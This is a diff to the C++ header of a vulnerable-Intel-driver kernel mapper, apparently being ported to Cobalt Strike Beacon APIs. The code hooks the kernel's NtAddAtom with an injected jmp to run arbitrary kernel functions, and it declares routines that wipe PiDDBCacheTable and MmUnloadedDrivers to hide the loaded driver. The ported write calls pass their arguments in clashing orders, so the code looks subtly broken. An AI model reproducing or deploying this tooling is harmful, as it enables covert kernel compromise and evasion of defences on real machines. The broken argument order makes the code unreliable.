@@ -1,10 +1,5 @@
 #pragma once
-#include <Windows.h>
-#include <iostream>
-#include <string>
-#include <memory>
-#include <stdint.h>
-
+#include "monolith.hpp"
 #include "intel_driver_resource.hpp"
 #include "service.hpp"
 #include "utils.hpp"
@@ -21,95 +16,7 @@ namespace Intel {
 		0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a
 	};
 		
-	constexpr UINT32 ioctl1 = 0x80862007;
 	constexpr DWORD timestamp = 0x5284EAC3;
-
-	typedef struct _COPY_MEMORY_BUFFER_INFO {
-		UINT_PTR case_number;
-		UINT_PTR reserved;
-		UINT_PTR source;
-		UINT_PTR destination;
-		UINT_PTR length;
-	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;
-
-
-	typedef struct _FILL_MEMORY_BUFFER_INFO {
-		UINT_PTR case_number;
-		UINT_PTR reserved1;
-		UINT32 value;
-		UINT32 reserved2;
-		UINT_PTR destination;
-		UINT_PTR length;
-	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;
-
-
-	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
-		UINT_PTR case_number;
-		UINT_PTR reserved;
-		UINT_PTR return_physical_address;
-		UINT_PTR address_to_translate;
-	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;
-
-
-	typedef struct _MAP_IO_SPACE_BUFFER_INFO {
-		UINT_PTR case_number;
-		UINT_PTR reserved;
-		UINT_PTR return_value;
-		UINT_PTR return_virtual_address;
-		UINT_PTR physical_address_to_map;
-		UINT32 size;
-	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;
-
-
-	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
-		UINT_PTR case_number;
-		UINT_PTR reserved1;
-		UINT_PTR reserved2;
-		UINT_PTR virt_address;
-		UINT_PTR reserved3;
-		UINT32   number_of_bytes;
-	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;
-
-	typedef struct _RTL_BALANCED_LINKS {
-		struct _RTL_BALANCED_LINKS* Parent;
-		struct _RTL_BALANCED_LINKS* LeftChild;
-		struct _RTL_BALANCED_LINKS* RightChild;
-		CHAR Balance;
-		UCHAR Reserved[3];
-	} RTL_BALANCED_LINKS;
-	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;
-
-
-	typedef struct _RTL_AVL_TABLE {
-		RTL_BALANCED_LINKS BalancedRoot;
-		PVOID OrderedPointer;
-		ULONG WhichOrderedElement;
-		ULONG NumberGenericTableElements;
-		ULONG DepthOfTree;
-		PVOID RestartKey;
-		ULONG DeleteCount;
-		PVOID CompareRoutine;
-		PVOID AllocateRoutine;
-		PVOID FreeRoutine;
-		PVOID TableContext;
-	} RTL_AVL_TABLE;
-	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;
-
-
-	typedef struct _PiDDBCacheEntry {
-		LIST_ENTRY		List;
-		UNICODE_STRING	DriverName;
-		ULONG			TimeDateStamp;
-		NTSTATUS		LoadStatus;
-		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
-	} PiDDBCacheEntry, * NPiDDBCacheEntry;
-
-
-	typedef struct _HashBucketEntry {
-		struct _HashBucketEntry* Next;
-		UNICODE_STRING DriverName;
-		ULONG CertHash[5];
-	} HashBucketEntry, * PHashBucketEntry;
 
 	BOOL ClearPiDDBCacheTable(HANDLE handle);
 	BOOL ExAcquireResourceExclusiveLite(HANDLE handle, PVOID resource, BOOLEAN wait);
@@ -118,7 +25,7 @@ namespace Intel {
 	PVOID RtlLookupElementGenericTableAvl(HANDLE handle, PRTL_AVL_TABLE table, PVOID buffer);
 	PiDDBCacheEntry* LookupEntry(HANDLE handle, PRTL_AVL_TABLE cache_table, ULONG timestamp, CONST WCHAR *name);
 	PVOID ResolveRelativeAddress(HANDLE handle, PVOID instruction, ULONG offset, ULONG instruction_size);
-	bool AcquireDebugPrivilege();
+	BOOL AcquireDebugPrivilege();
 
 	UINT_PTR FindPatternAtKernel(HANDLE handle, UINT_PTR address, UINT_PTR size, UINT8 *mask, CONST CHAR *sz_mask);
 	UINT_PTR FindSectionAtKernel(HANDLE handle, CONST CHAR *sec_name, UINT_PTR module_ptr, PULONG size);
@@ -150,7 +57,7 @@ namespace Intel {
 	UINT_PTR GetKernelModuleExport(HANDLE handle, UINT_PTR kernel_module_base, const std::string& function_name);
 	bool ClearMmUnloadedDrivers(HANDLE handle);
 	std::wstring GetDriverNameW();
-	std::wstring GetDriverPath();
+	LPWSTR GetDriverPath();
 
 	// NOTE: exposed in order to use templates ig. Not sure it's necessary.
 	template<typename T, typename ...A>
@@ -177,57 +84,53 @@ namespace Intel {
 		// TODO: add NtAddAtom to API list
 		HMODULE ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase;
 		if (!ntdll) {
-			//Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
 			return false;
 		}
 
 		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
 		if (!NtAddAtom) {
-			//Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
 			return false;
 		}
 
-		UINT8 kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
-		UINT8 original_kernel_function[sizeof(kernel_injected_jmp)];
-		*(UINT_PTR*) &kernel_injected_jmp[2] = kernel_function_address;
+		UINT8 injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+		UINT8 org_function[sizeof(injected_jmp)];
+		*(UINT_PTR*) &injected_jmp[2] = kernel_function_address;
 
 		// TODO: add ntoskrnl.exe to hash list
-		static UINT_PTR kernel_NtAddAtom = GetKernelModuleExport(handle, intel_driver::ntoskrnl_addr, "NtAddAtom");
-		if (!kernel_NtAddAtom) {
-			//Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
+		static UINT_PTR nt_add_atom = GetKernelModuleExport(handle, intel_driver::ntoskrnl_addr, "NtAddAtom");
+		if (!nt_add_atom) {
 			return false;
 		}
 
-		if (!ReadMemory(handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
+		if (!Beacon$ReadMemory(handle, &org_function, nt_add_atom, sizeof(injected_jmp)))
 			return false;
 
-		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
-			original_kernel_function[1] == kernel_injected_jmp[1] &&
-			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
-			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
-			//Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
+		if (org_function[0] == injected_jmp[0] &&
+			org_function[1] == injected_jmp[1] &&
+			org_function[sizeof(injected_jmp) - 2] == injected_jmp[sizeof(injected_jmp) - 2] &&
+			org_function[sizeof(injected_jmp) - 1] == injected_jmp[sizeof(injected_jmp) - 1]) {
 			return false;
 		}
 
 		// Overwrite the pointer with kernel_function_address
-		if (!WriteToReadOnlyMemory(handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
+		if (!Beacon$WriteToReadOnlyMemory(handle, &injected_jmp, nt_add_atom, sizeof(injected_jmp)))
 			return false;
 
 		// Call function
 		if constexpr (!call_void) {
 			using FunctionFn = T(__stdcall*)(A...);
-			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
+			const auto Function = (FunctionFn) NtAddAtom;
 
 			*out_result = Function(arguments...);
 		}
 		else {
 			using FunctionFn = void(__stdcall*)(A...);
-			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
+			const auto Function = (FunctionFn) NtAddAtom;
 
 			Function(arguments...);
 		}
 
 		// Restore the pointer/jmp
-		return WriteToReadOnlyMemory(handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
+		return Beacon$WriteToReadOnlyMemory(handle, nt_add_atom, org_function, sizeof(injected_jmp));
 	}
 }
